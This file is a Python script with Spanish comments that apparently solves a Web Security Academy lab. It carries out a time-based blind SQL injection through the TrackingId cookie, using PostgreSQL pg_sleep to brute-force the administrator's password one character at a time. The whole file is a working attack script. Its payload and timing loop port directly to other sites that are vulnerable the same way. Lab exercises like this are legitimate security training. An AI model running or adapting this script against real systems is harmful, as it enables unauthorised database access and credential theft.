#!/usr/bin/python3

from pwn import * # lo utilizaremos para barras de progreso

import requests #realizar peticiones

import signal #capturar teclado

import time # usar tiempo

import pdb # debugging

import sys # interctuar co el sistema

import string # para jugar con caracteres


def saliendo(sig, frame):
	print('\n\n[+] Saliendo...\n\n')
	sys.exit(1)


# Capturar control C
signal.signal(signal.SIGINT, saliendo) # cuando hagamos ctrl_c mandamos l flujo del progama a la funcion saliendo

#definicio de variables

urlinyectada='https://0aa5001704726b568102a73300a300ac.web-security-academy.net' # url a la que inyectaremos 
caracteres=string.printable  # añadimos todos los caracteres printeables
tiempo_respuesta=10 #Cuanto mas bajo el tiempo de respuesta mas falsos positivos tendremos, si lo cambiais aqui, tambien debeis cambiarlo en la query



def peticion():

	contraseña='' # lo definimos vacio para en el bucle for ir aumentandolo

	progreso1 = log.progress('Fuerza bruta') # creamos una barra de progreso 1
	progreso1.status('Iniciando fuerza bruta') #le actualizamos el estado

	time.sleep(1) # damos tiempo para leer lo bien que lo hacemos

	progreso2 = log.progress('Password') # creamos la sgunda barra de progreso para qu nos actualice la pass
	progreso2.status('Analizando pasword')

	for posicion in range(1,21): # definiremos aqui la longitud del campo a testear
		for caracter in caracteres:
			
			cookie= {  # definimos las cookies
				"TrackingId":"qZObvNQsU1JDzTTb'||(select case when substring(password,%d,1)='%s' then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')-- -" % (posicion,caracter),
				"session":"NBg3vBObSnPtxXJ4VAX49k7NiccS0Vyp"
				}
			progreso1.status(cookie['TrackingId']) # queremos que se actualice cpara que vamos lo que mandamos en cada bucle for

			start_time = time.time() # empezamos un cronometro
			r = requests.get(urlinyectada, cookies=cookie) # realizamos la peticion a laurl con las cookies
			end_time = time.time()#paamos el cronometro
			
			response_time = end_time - start_time # calculamos lo que ha tarado la respusta

			#time.sleep(1) # a veces hace falta darle un respiro entre query y query

			if response_time > tiempo_respuesta: # verificacion de que acertamos con el caracter, tambien podemos jgar con  length...

				contraseña += caracter # le sumamo a contraseña el caracter en el que esté
				progreso2.status(contraseña)
				break # para que no continue probando el resto de caracteres 



def main():

	peticion()


main()

